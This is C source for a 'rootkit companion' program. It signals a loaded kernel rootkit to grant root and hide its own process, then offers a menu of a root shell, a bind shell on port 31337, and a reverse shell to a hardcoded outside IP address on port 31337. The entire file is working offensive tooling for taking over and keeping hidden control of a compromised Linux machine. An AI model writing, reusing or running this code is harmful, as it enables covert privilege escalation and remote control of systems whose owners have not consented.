#include "../src/inc/uapi/rootkit.h"
#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef REMOTE_ADDR
#define REMOTE_ADDR "194.163.157.141"
#endif
#ifndef REMOTE_PORT
#define REMOTE_PORT 31337
#endif
#ifndef LOCAL_PORT
#define LOCAL_PORT 31337
#endif

void send_signals(void)
{
    // Become root
    printf("Sending signal SIGROOT...\n");
    syscall(SYS_kill, PID_SECRET, SIGROOT);

    // Hide process
    printf("Sending signal SIGHIDE...\n");
    syscall(SYS_kill, PID_SELF, SIGHIDE);
}

void print_options(void)
{
    printf("Welcome to the rootkit companion!\n");
    putchar('\n');
    printf("Available options:\n");
    printf("  1: Root shell\n");
    printf("  2: Reverse shell\n");
    printf("  3: Bind shell\n");
    printf("  q: Exit\n");
}

char get_input(void)
{
    char c = 0;

    printf("Enter your choice: ");
    c = getchar();
    while (getchar() != '\n')
        ;

    return c;
}

int spawn_shell(void)
{
    printf("Spawning root shell...\n");
    return execl("/bin/sh", "sh", "-l", NULL);
}

int reverse_shell(void)
{
    int i32_sockfd           = 0;
    int i32_ret              = 0;
    struct sockaddr_in sa_in = { 0 };

    printf("Spawning reverse shell to %s:%hu...\n", REMOTE_ADDR, REMOTE_PORT);

    i32_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (i32_sockfd < 0) {
        perror("socket");
        return i32_sockfd;
    }

    sa_in.sin_family      = AF_INET;
    sa_in.sin_port        = htons(REMOTE_PORT);
    sa_in.sin_addr.s_addr = inet_addr(REMOTE_ADDR);

    i32_ret = connect(i32_sockfd, (struct sockaddr *)&sa_in, sizeof(sa_in));
    if (i32_ret < 0) {
        perror("connect");
        return i32_ret;
    }

    dup2(i32_sockfd, 0);
    dup2(i32_sockfd, 1);
    dup2(i32_sockfd, 2);

    i32_ret = execl("/bin/sh", "sh", NULL);

    close(i32_sockfd);
    return i32_ret;
}

int bind_shell(void)
{
    int i32_sockfd           = 0;
    int i32_ret              = 0;
    struct sockaddr_in sa_in = { 0 };

    printf("Spawning bind shell on port %hu...\n", LOCAL_PORT);

    i32_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (i32_sockfd < 0) {
        perror("socket");
        return i32_sockfd;
    }

    sa_in.sin_family      = AF_INET;
    sa_in.sin_port        = htons(LOCAL_PORT);
    sa_in.sin_addr.s_addr = htonl(INADDR_ANY);

    i32_ret = bind(i32_sockfd, (struct sockaddr *)&sa_in, sizeof(sa_in));
    if (i32_ret < 0) {
        perror("bind");
        return i32_ret;
    }

    i32_ret = listen(i32_sockfd, 0);
    if (i32_ret < 0) {
        perror("listen");
        return i32_ret;
    }

    i32_ret = accept(i32_sockfd, NULL, NULL);
    if (i32_ret < 0) {
        perror("accept");
        return i32_ret;
    }

    dup2(i32_ret, 0);
    dup2(i32_ret, 1);
    dup2(i32_ret, 2);

    i32_ret = execl("/bin/sh", "sh", NULL);

    close(i32_sockfd);
    return i32_ret;
}

int main(void)
{
    char c_input = 0;

    // Send signals to the rootkit
    send_signals();

    while (c_input != 'q') {
        print_options();
        c_input = get_input();

        switch (c_input) {
        case '1':
            spawn_shell();
            break;
        case '2':
            reverse_shell();
            break;
        case '3':
            bind_shell();
            break;
        default:
            printf("Invalid option\n");
            break;
        }

        putchar('\n');
    }

    printf("Exiting...\n");
    return 0;
}
